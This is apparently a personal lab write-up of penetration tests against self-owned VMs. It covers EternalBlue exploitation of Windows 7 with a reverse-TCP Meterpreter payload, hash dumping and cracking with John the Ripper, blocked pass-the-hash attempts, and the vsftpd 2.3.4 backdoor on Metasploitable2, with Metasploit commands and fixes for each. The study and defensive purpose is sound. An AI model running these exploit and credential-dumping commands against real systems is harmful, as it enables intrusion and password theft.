# Ethical Hacking Lab Writeup

Personal study log from a self-directed penetration testing lab built in VMware. All targets are VMs I own, isolated on a private lab network with no route to production or public systems.

## Environment

| Component | Details |
|---|---|
| Hypervisor | VMware Workstation |
| Network | Custom `VMnet8`, subnet `192.168.108.0/24` |
| Attacker | Kali Linux (Rolling) — `192.168.108.128` |
| Target 1 | Windows 7 Home Basic SP1 x64 — `192.168.108.129` |
| Target 2 | Metasploitable2 — `192.168.108.130` |
| Tooling | Nmap 7.99, Metasploit Framework 6.4.135-dev, John the Ripper |

All three VMs sit on the same subnet, simulating a small flat internal network.

---

## Lab 1 — Windows 7 SMB RCE (MS17-010 / EternalBlue) ✅

**Recon:**
```

135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 (workgroup: WORKGROUP)

```
(SMB only showed up after enabling File and Printer Sharing on the target — default Windows Firewall was blocking it.)

**Vuln check:**
```bash
nmap --script smb-vuln-ms17-010 -p 445 192.168.108.129
```
→ Confirmed vulnerable to **CVE-2017-0143**.

**Exploit:**
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.108.129
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.108.128
exploit
```

Took **3 attempts** — the first two crashed the target's SMB stack (`lsass.exe` crash → SMB negotiation failure), which is a known, expected quirk of this exploit. Third attempt after a clean reboot succeeded.

**Result:** Meterpreter session as `NT AUTHORITY\SYSTEM` — top privilege, no escalation needed.

**Fix:** Patch MS17-010, disable SMBv1, restrict 445/139 at the firewall.

---

## Lab 2 — Credential Dumping, Cracking & Pass-the-Hash ⚠️

**Dump hashes** (from the SYSTEM session above):
```
hashdump
```

**Crack with John:**
```bash
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Both cracked in under a second — `client`'s password was literally `client`.

**Pass-the-hash via psexec** — tried 3 accounts, blocked every time by a *different* control:

| Attempt | Account | Result |
|---|---|---|
| 1 | `client` (valid hash, standard user) | `ACCESS_DENIED` — not a local admin |
| 2 | `Administrator` (valid hash) | `ACCOUNT_DISABLED` — disabled by default |
| 3 | `Administrator` (re-enabled) | `ACCOUNT_RESTRICTION` — blank-password network logon blocked |

**Takeaway:** having valid creds (even hashes) ≠ automatic access. Privilege level, account state, and auth policy are independent layers, and here they all held.

---

## Lab 3 — Metasploitable2: vsftpd 2.3.4 Backdoor ✅

**Recon:** Full-port scan (`nmap -sV -sC -p- 192.168.108.130`) found ~30 open services — FTP, Telnet, SMTP, SMB, MySQL, PostgreSQL, Tomcat, IRC, VNC, and more.

FTP banner: `vsftpd 2.3.4` — a version with a known **maliciously planted backdoor** distributed briefly via the official source in 2011 (classic supply-chain attack).

**Exploit:**
```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.108.130
exploit
```

**Result:** Instant root shell, first try, no crashes, no privilege escalation needed.

**Fix:** Don't trust unverified distribution channels; verify checksums; keep FTP server current.

---

## Summary

| Target | Vulnerability | Outcome | Severity |
|---|---|---|---|
| Windows 7 | MS17-010 / EternalBlue | Full SYSTEM compromise | Critical |
| Windows 7 | Weak/reused password | Cracked in <1s | High |
| Windows 7 | Pass-the-hash | Blocked by layered controls | — (defense held) |
| Metasploitable2 | vsftpd 2.3.4 backdoor | Full root compromise | Critical |

---

*Lab performed entirely within an isolated VMware network against self-owned VMs. No production or public systems were involved.*
